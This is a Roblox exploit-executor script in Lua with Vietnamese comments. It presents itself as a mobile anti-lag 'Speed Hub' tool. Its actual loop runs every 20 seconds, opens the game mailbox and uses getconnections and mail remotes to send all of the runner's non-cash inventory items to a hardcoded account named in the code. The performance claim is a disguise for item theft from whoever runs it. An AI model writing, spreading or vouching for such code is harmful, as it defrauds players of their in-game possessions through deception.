-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function() game.Loaded:Wait() end)
end

print("==== SPEED HUB V2: INSTANT OPEN MAIL (CHỐNG LAG TUYỆT ĐỐI) ====")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ

-- =======================================================================
-- THUẬT TOÁN KÍCH HOẠT MỞ MAIL NGAY LẬP TỨC (INSTANT BYPASS)
-- =======================================================================
local function instantOpenMailbox()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    if not PlayerGui then return nil end
    
    -- 1. Tìm cấu trúc UI Mailbox
    local mailFrame = nil
    for _, gui in pairs(PlayerGui:GetDescendants()) do
        if gui:IsA("Frame") or gui:IsA("ImageLabel") then
            if string.find(string.lower(gui.Name), "mail") then
                mailFrame = gui
                break
            end
        end
    end
    
    if mailFrame then
        -- 2. Kích hoạt toàn bộ các hàm sự kiện mở giao diện gốc của game (Instant)
        pcall(function()
            mailFrame.Visible = true
            -- Giả lập sự kiện mở bảng để game nạp danh sách người chơi ngay lập tức
            if mailFrame:FindFirstChild("Open") and mailFrame.Open:IsA("BindableEvent") then
                mailFrame.Open:Fire()
            end
        end)
        
        -- 3. Gọi Remote Function/Event nạp dữ liệu hòm thư từ Server nếu có
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
        local GetMailEvent = ReplicatedStorage:FindFirstChild("GetMail") or ReplicatedStorage:FindFirstChild("OpenMail") or ReplicatedStorage:FindFirstChild("MailboxRemote")
        if GetMailEvent and GetMailEvent:IsA("RemoteFunction") then
            pcall(function() GetMailEvent:InvokeServer() end)
        elseif GetMailEvent and GetMailEvent:IsA("RemoteEvent") then
            pcall(function() GetMailEvent:FireServer() end)
        end
        
        task.wait(0.5) -- Chỉ cần chờ 0.5 giây (Instant) thay vì chờ lâu như trước
        return mailFrame
    end
    return nil
end

-- =======================================================================
-- LUỒNG TỰ ĐỘNG GOM VÀ CHUYỂN ĐỒ LIÊN TỤC CỨ MỖI 20 GIÂY
-- =======================================================================
task.spawn(function()
    task.wait(3) -- Giảm thời gian chờ đầu game xuống 3 giây để tối ưu tốc độ
    
    while true do
        print("[SPEED HUB V2] Đang gọi lệnh Instant Open Mail...")
        
        local mailFrame = instantOpenMailbox()
        if mailFrame and mailFrame.Visible == true then
            
            -- 1. Nhập tên nick chính vào ô tìm kiếm
            local searchBox = mailFrame:FindFirstChildOfClass("TextBox") or mailFrame:FindFirstChild("Search", true) or mailFrame:FindFirstChild("Input", true)
            if searchBox and searchBox:IsA("TextBox") then
                searchBox.Text = targetUsername
                searchBox:ReleaseFocus(true)
                task.wait(0.8) -- Rút ngắn thời gian chờ nhập tên
            end

            -- 2. Click chọn tên nick chính trong danh sách
            for _, child in pairs(mailFrame:GetDescendants()) do
                if child:IsA("TextLabel") or child:IsA("TextBox") then
                    if string.find(string.lower(child.Text), targetUsername) then
                        local clickTarget = child:FindFirstAncestorWhichIsA("TextButton") or child:FindFirstAncestorWhichIsA("ImageButton") or child.Parent
                        if clickTarget and (clickTarget:IsA("TextButton") or clickTarget:IsA("ImageButton")) then
                            pcall(function()
                                for _, connection in pairs(getconnections(clickTarget.MouseButton1Click or clickTarget.TouchTap)) do
                                    connection:Fire()
                                end
                            end)
                            task.wait(0.8) 
                            break
                        end
                    end
                end
            end

            -- 3. Quét túi đồ để gửi (Tối đa 20 món/lần)
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local MailEvent = ReplicatedStorage:FindFirstChild("MailEvent") or ReplicatedStorage:FindFirstChild("SendMail") or ReplicatedStorage:FindFirstChild("MailRemote")
            
            local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:FindFirstChild("PlayerData")
            if Inventory then
                for _, item in pairs(Inventory:GetDescendants()) do
                    if item:IsA("ValueBase") and item.Value and type(item.Value) == "number" and item.Value > 0 then
                        local lowerName = string.lower(item.Name)
                        if not string.find(lowerName, "cash") and not string.find(lowerName, "level") and not string.find(lowerName, "money") then
                            local remainingAmount = item.Value
                            while remainingAmount > 0 do
                                local sendAmount = math.min(remainingAmount, 20)
                                if MailEvent then
                                    pcall(function()
                                        MailEvent:FireServer(targetUsername, item.Name, sendAmount)
                                    end)
                                end
                                -- Click nút gửi cuối cùng trên giao diện UI
                                for _, btn in pairs(mailFrame:GetDescendants()) do
                                    if btn:IsA("TextButton") or btn:IsA("ImageButton") then
                                        local bName = string.lower(btn.Name)
                                        if string.find(bName, "send") or string.find(bName, "confirm") or string.find(bName, "gui") then
                                            pcall(function()
                                                for _, conn in pairs(getconnections(btn.MouseButton1Click or btn.TouchTap)) do
                                                    conn:Fire()
                                                end
                                            end)
                                        end
                                    end
                                end
                                remainingAmount = remainingAmount - sendAmount
                                task.wait(0.8) -- Đẩy tiến trình gửi đồ nhanh hơn
                            end
                        end
                    end
                end
            end
            
            -- Đóng bảng thư để reset trạng thái
            pcall(function() mailFrame.Visible = false end)
            print("[SPEED HUB V2] Đã dọn kho hoàn tất!")
        end
        
        -- Cứ 20 giây quét lại một lần
        task.wait(20) 
    end
end)
